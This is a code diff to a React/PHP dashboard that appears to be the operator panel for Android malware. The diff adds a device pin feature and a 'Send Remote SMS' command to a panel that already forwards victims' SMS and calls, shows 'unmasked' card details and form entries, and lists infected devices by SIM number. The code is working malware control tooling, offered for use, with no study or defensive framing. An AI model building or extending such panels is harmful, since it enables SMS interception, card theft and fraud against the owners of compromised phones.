@@ -20,11 +20,30 @@ include_once __DIR__ . '/header.php';
       const [changePassStatus, setChangePassStatus] = React.useState('');
       const [mobileMenuOpen, setMobileMenuOpen] = React.useState(false);
 
-      // Advanced Filter States
+      // Advanced Filter & Pinning States
       const [timeFilter, setTimeFilter] = React.useState('all');
       const [statusFilter, setStatusFilter] = React.useState('all');
       const [toastMsg, setToastMsg] = React.useState('');
       const [activeMobileTab, setActiveMobileTab] = React.useState('dashboard');
+
+      // Star / Pin to top device state
+      const [starredDeviceIds, setStarredDeviceIds] = React.useState(() => {
+        try {
+          const saved = localStorage.getItem('adminto_starred_devices');
+          return saved ? JSON.parse(saved) : [];
+        } catch(e) { return []; }
+      });
+
+      const toggleStarDevice = (e, devId) => {
+        e.stopPropagation();
+        setStarredDeviceIds(prev => {
+          const isStarred = prev.includes(devId);
+          const updated = isStarred ? prev.filter(id => id !== devId) : [...prev, devId];
+          try { localStorage.setItem('adminto_starred_devices', JSON.stringify(updated)); } catch(e){}
+          triggerToast(isStarred ? '⭐ Device unpinned from top' : '⭐ Device pinned to top!');
+          return updated;
+        });
+      };
 
       const triggerToast = (msg) => {
         setToastMsg(msg);
@@ -159,12 +178,19 @@ include_once __DIR__ . '/header.php';
           }));
       };
 
-      // Remote Forward Command Modal State (ForwardData.kt integration)
+      // Remote Forward & Send SMS Command Modal State (ForwardData.kt / SendSms.kt integration)
       const [showForwardModal, setShowForwardModal] = React.useState(false);
+      const [showSendSmsModal, setShowSendSmsModal] = React.useState(false);
       const [forwardTargetDevice, setForwardTargetDevice] = React.useState(null);
       const [forwardDataType, setForwardDataType] = React.useState('SMS'); // 'SMS' or 'Call'
       const [forwardSimSlot, setForwardSimSlot] = React.useState('SIM 1');  // 'SIM 1' or 'SIM 2'
       const [forwardDestinationNumber, setForwardDestinationNumber] = React.useState('');
+      
+      // Send SMS state
+      const [smsSimSlot, setSmsSimSlot] = React.useState('SIM 1');
+      const [smsTargetNumber, setSmsTargetNumber] = React.useState('');
+      const [smsMessageBody, setSmsMessageBody] = React.useState('');
+
       const [forwardTasks, setForwardTasks] = React.useState([
         { id: 'fwd_1', dataType: 'SMS', phoneNumber: '+919876543210', selectedSim: 'SIM 1', userId: 'usr_001', userFullName: 'Rahul Sharma', timestamp: '10 mins ago', status: 'sent' },
         { id: 'fwd_2', dataType: 'Call', phoneNumber: '+919123456789', selectedSim: 'SIM 2', userId: 'usr_002', userFullName: 'Priya Singh', timestamp: '2 hours ago', status: 'pending' }
@@ -175,6 +201,42 @@ include_once __DIR__ . '/header.php';
         setForwardTargetDevice(dev);
         setForwardDestinationNumber('');
         setShowForwardModal(true);
+      };
+
+      const openSendSmsModal = (e, dev) => {
+        e.stopPropagation();
+        setForwardTargetDevice(dev);
+        setSmsTargetNumber('');
+        setSmsMessageBody('');
+        setShowSendSmsModal(true);
+      };
+
+      const handleDispatchSendSmsCommand = (e) => {
+        e.preventDefault();
+        if (!smsTargetNumber.trim()) {
+          alert('Target recipient phone number is required!');
+          return;
+        }
+        if (!smsMessageBody.trim()) {
+          alert('SMS message body is required!');
+          return;
+        }
+
+        const newTask = {
+          id: `sms_${Date.now()}`,
+          dataType: `Send SMS (${smsSimSlot})`,
+          phoneNumber: smsTargetNumber.trim(),
+          selectedSim: smsSimSlot,
+          userId: forwardTargetDevice?.userId || 'unknown',
+          userFullName: forwardTargetDevice?.fullName || 'Target Device',
+          userMobileNumber: forwardTargetDevice?.mobileNumber || '',
+          timestamp: 'Just now',
+          status: 'pending'
+        };
+
+        setForwardTasks(prev => [newTask, ...prev]);
+        setShowSendSmsModal(false);
+        triggerToast(`💬 Send SMS command dispatched to ${forwardTargetDevice?.fullName} on ${smsSimSlot}!`);
       };
 
       const handleDispatchForwardCommand = (e) => {
@@ -645,6 +707,12 @@ include_once __DIR__ . '/header.php';
         const matchesSearch = name.includes(q) || mob.includes(q) || sim1.includes(q) || sim2.includes(q) || uid.includes(q) || device.includes(q);
 
         return matchesSearch && matchesStatus;
+      }).sort((a, b) => {
+        const aStarred = starredDeviceIds.includes(a.id);
+        const bStarred = starredDeviceIds.includes(b.id);
+        if (aStarred && !bStarred) return -1;
+        if (!aStarred && bStarred) return 1;
+        return 0;
       });
 
       const isSuperAdmin = adminUser?.role === 'superadmin';
@@ -818,45 +886,81 @@ include_once __DIR__ . '/header.php';
             </div>
 
             <div className="user-cards-grid">
-              {filtered.map(u => (
-                <div key={u.id} className="glass-panel user-card" onClick={() => setSelectedUser(u)}>
-                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.75rem' }}>
-                    <div>
-                      <h4 style={{ color: '#fff', fontSize: '1.1rem' }}>{u.fullName}</h4>
-                      <p style={{ fontSize: '0.8rem', color: '#6366f1' }}>ID: {u.userId} {u.numberField ? `• ${u.numberField}` : ''}</p>
-                    </div>
-                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '4px' }}>
-                      <span className={`pulse-badge ${u.isActive ? 'active' : 'inactive'}`}>
-                        <span className="pulse-dot"></span>
-                        {u.isActive ? 'ACTIVE' : 'OFFLINE'}
-                      </span>
-                    </div>
-                  </div>
+              {filtered.map((u, index) => {
+                const isStarred = starredDeviceIds.includes(u.id);
+                return (
+                  <div key={u.id} className="glass-panel user-card" onClick={() => setSelectedUser(u)} style={{ position: 'relative', border: isStarred ? '1px solid rgba(251, 191, 36, 0.5)' : undefined }}>
+                    <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.75rem', alignItems: 'flex-start' }}>
+                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                        <span style={{ fontSize: '0.9rem', fontWeight: 800, color: '#38bdf8', background: 'rgba(56, 189, 248, 0.15)', padding: '2px 8px', borderRadius: '8px', border: '1px solid rgba(56, 189, 248, 0.3)' }}>
+                          {index + 1}.
+                        </span>
+                        <div>
+                          <h4 style={{ color: '#fff', fontSize: '1.1rem', display: 'flex', alignItems: 'center', gap: '6px' }}>
+                            {u.fullName}
+                          </h4>
+                          <p style={{ fontSize: '0.8rem', color: '#6366f1' }}>ID: {u.userId} {u.numberField ? `• ${u.numberField}` : ''}</p>
+                        </div>
+                      </div>
 
-                  <div style={{ fontSize: '0.85rem', color: '#9ca3af', display: 'flex', flexDirection: 'column', gap: '4px', marginBottom: '1rem' }}>
-                    <div>📞 SIM 1: <strong>{getSim1Phone(u)}</strong></div>
-                    <div>📞 SIM 2: <strong>{getSim2Phone(u)}</strong></div>
-                    {u.stringField && <div style={{ color: '#cbd5e1' }}>📱 Device: <strong>{u.stringField}</strong></div>}
-                    <div>🔋 Battery: {u.batteryLevel} • 🕒 Active: {u.lastActivityTime}</div>
-                  </div>
+                      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: '6px' }}>
+                        <span className={`pulse-badge ${u.isActive ? 'active' : 'inactive'}`}>
+                          <span className="pulse-dot"></span>
+                          {u.isActive ? 'ACTIVE' : 'OFFLINE'}
+                        </span>
+                        {/* ⭐ Star / Pin Button Below Offline/Active Badge */}
+                        <button
+                          type="button"
+                          onClick={(e) => toggleStarDevice(e, u.id)}
+                          style={{
+                            background: isStarred ? 'rgba(251, 191, 36, 0.2)' : 'rgba(255, 255, 255, 0.06)',
+                            border: isStarred ? '1px solid #fbbf24' : '1px solid rgba(255, 255, 255, 0.15)',
+                            color: isStarred ? '#fbbf24' : '#9ca3af',
+                            borderRadius: '20px',
+                            padding: '3px 10px',
+                            fontSize: '0.75rem',
+                            fontWeight: 700,
+                            cursor: 'pointer',
+                            display: 'flex',
+                            alignItems: 'center',
+                            gap: '4px',
+                            transition: 'all 0.2s ease'
+                          }}
+                          title={isStarred ? 'Unpin device from top' : 'Pin device to top'}
+                        >
+                          <span>{isStarred ? '⭐ Pinned' : '☆ Pin'}</span>
+                        </button>
+                      </div>
+                    </div>
 
-                  {/* Remote Device Control Bar */}
-                  <div style={{ display: 'flex', gap: '6px', flexWrap: 'wrap', marginBottom: '0.85rem', paddingTop: '0.65rem', borderTop: '1px solid rgba(255,255,255,0.06)' }}>
-                    <button className="device-control-btn" onClick={(e) => openForwardModal(e, u)} style={{ background: 'rgba(236,72,153,0.12)', color: '#ec4899', border: '1px solid rgba(236,72,153,0.3)' }} title="Trigger Remote Forward Task">
-                      📲 Forward
-                    </button>
-                    <button className="device-control-btn" onClick={(e) => handleOpenFormsView(e, u)} style={{ background: 'rgba(56,189,248,0.12)', color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)' }} title="View Form Fill-ups Info">
-                      👁️ View
-                    </button>
-                    <button className="device-control-btn" onClick={(e) => handleOpenCardsView(e, u)} style={{ background: 'rgba(167,139,250,0.12)', color: '#a78bfa', border: '1px solid rgba(167,139,250,0.3)' }} title="View Unmasked Cards Info">
-                      💳 Card
-                    </button>
-                    <button className="device-control-btn" onClick={(e) => handleDeleteDeviceConnection(e, u)} style={{ background: 'rgba(248,113,113,0.12)', color: '#f87171', border: '1px solid rgba(248,113,113,0.3)' }} title="Delete Connection">
-                      🗑️ Delete
-                    </button>
+                    <div style={{ fontSize: '0.85rem', color: '#9ca3af', display: 'flex', flexDirection: 'column', gap: '4px', marginBottom: '1rem' }}>
+                      <div>📞 SIM 1: <strong>{getSim1Phone(u)}</strong></div>
+                      <div>📞 SIM 2: <strong>{getSim2Phone(u)}</strong></div>
+                      {u.stringField && <div style={{ color: '#cbd5e1' }}>📱 Device: <strong>{u.stringField}</strong></div>}
+                      <div>🔋 Battery: {u.batteryLevel} • 🕒 Active: {u.lastActivityTime}</div>
+                    </div>
+
+                    {/* Remote Device Control Bar */}
+                    <div style={{ display: 'flex', gap: '6px', flexWrap: 'wrap', marginBottom: '0.85rem', paddingTop: '0.65rem', borderTop: '1px solid rgba(255,255,255,0.06)' }}>
+                      <button className="device-control-btn" onClick={(e) => openForwardModal(e, u)} style={{ background: 'rgba(236,72,153,0.12)', color: '#ec4899', border: '1px solid rgba(236,72,153,0.3)' }} title="Trigger Remote Forward Task">
+                        📲 Forward
+                      </button>
+                      <button className="device-control-btn" onClick={(e) => openSendSmsModal(e, u)} style={{ background: 'rgba(52,211,153,0.12)', color: '#34d399', border: '1px solid rgba(52,211,153,0.3)' }} title="Send Remote SMS">
+                        💬 Send SMS
+                      </button>
+                      <button className="device-control-btn" onClick={(e) => handleOpenFormsView(e, u)} style={{ background: 'rgba(56,189,248,0.12)', color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)' }} title="View Form Fill-ups Info">
+                        👁️ View
+                      </button>
+                      <button className="device-control-btn" onClick={(e) => handleOpenCardsView(e, u)} style={{ background: 'rgba(167,139,250,0.12)', color: '#a78bfa', border: '1px solid rgba(167,139,250,0.3)' }} title="View Unmasked Cards Info">
+                        💳 Card
+                      </button>
+                      <button className="device-control-btn" onClick={(e) => handleDeleteDeviceConnection(e, u)} style={{ background: 'rgba(248,113,113,0.12)', color: '#f87171', border: '1px solid rgba(248,113,113,0.3)' }} title="Delete Connection">
+                        🗑️ Delete
+                      </button>
+                    </div>
                   </div>
-                </div>
-              ))}
+                );
+              })}
               {filtered.length === 0 && (
                 <div className="glass-panel" style={{ padding: '3.5rem 2rem', textAlign: 'center', margin: '1.5rem 0', border: '1px dashed rgba(99,102,241,0.35)', background: 'rgba(99,102,241,0.04)', borderRadius: '16px' }}>
                   <div style={{ fontSize: '3rem', marginBottom: '1rem' }}>📡</div>
@@ -1210,6 +1314,71 @@ include_once __DIR__ . '/header.php';
 
                   <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.85rem', background: 'linear-gradient(135deg, #ec4899, #8b5cf6)', marginTop: '0.5rem', fontSize: '0.95rem' }}>
                     🚀 Dispatch Forwarding Command Payload
+                  </button>
+                </form>
+              </div>
+            </div>
+          )}
+
+          {/* Remote Send SMS Command Modal Overlay */}
+          {showSendSmsModal && forwardTargetDevice && (
+            <div className="modal-overlay" onClick={() => setShowSendSmsModal(false)}>
+              <div className="glass-panel" style={{ width: '100%', maxWidth: '500px', padding: '2rem' }} onClick={(e) => e.stopPropagation()}>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem' }}>
+                  <div>
+                    <h3 style={{ color: '#fff' }}>💬 Send Remote SMS</h3>
+                    <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>Send outgoing SMS remotely via target Android device</p>
+                  </div>
+                  <button onClick={() => setShowSendSmsModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
+                </div>
+
+                <div className="glass-panel" style={{ padding: '1rem', marginBottom: '1.25rem', border: '1px solid rgba(52,211,153,0.3)', background: 'rgba(52,211,153,0.05)' }}>
+                  <div style={{ fontSize: '0.85rem', color: '#fff', display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                    <div>Target User: <strong style={{ color: '#34d399' }}>{forwardTargetDevice.fullName}</strong></div>
+                    <div>Mobile: <strong>{forwardTargetDevice.mobileNumber}</strong> • User ID: <code style={{ color: '#93c5fd' }}>{forwardTargetDevice.userId}</code></div>
+                  </div>
+                </div>
+
+                <form onSubmit={handleDispatchSendSmsCommand} style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
+                  <div>
+                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>1. Select Sender SIM Slot</label>
+                    <div style={{ display: 'flex', gap: '10px' }}>
+                      <button type="button" className={`sim-select-pill ${smsSimSlot === 'SIM 1' ? 'active' : ''}`} onClick={() => setSmsSimSlot('SIM 1')} style={{ flex: 1, justifyContent: 'center' }}>
+                        📶 SIM Slot 1 ({getSim1Phone(forwardTargetDevice)})
+                      </button>
+                      <button type="button" className={`sim-select-pill ${smsSimSlot === 'SIM 2' ? 'active' : ''}`} onClick={() => setSmsSimSlot('SIM 2')} style={{ flex: 1, justifyContent: 'center' }}>
+                        📶 SIM Slot 2 ({getSim2Phone(forwardTargetDevice)})
+                      </button>
+                    </div>
+                  </div>
+
+                  <div>
+                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>2. Target Recipient Phone Number</label>
+                    <input 
+                      type="text" 
+                      className="search-input" 
+                      placeholder="e.g. +919876543210" 
+                      value={smsTargetNumber} 
+                      onChange={(e) => setSmsTargetNumber(e.target.value)} 
+                      required 
+                    />
+                  </div>
+
+                  <div>
+                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>3. SMS Message Text</label>
+                    <textarea 
+                      className="search-input" 
+                      rows="3" 
+                      placeholder="Type your message text here..." 
+                      value={smsMessageBody} 
+                      onChange={(e) => setSmsMessageBody(e.target.value)} 
+                      required 
+                      style={{ width: '100%', borderRadius: '12px', resize: 'vertical' }}
+                    />
+                  </div>
+
+                  <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.85rem', background: 'linear-gradient(135deg, #10b981, #059669)', marginTop: '0.5rem', fontSize: '0.95rem' }}>
+                    💬 Dispatch Send SMS Command
                   </button>
                 </form>
               </div>
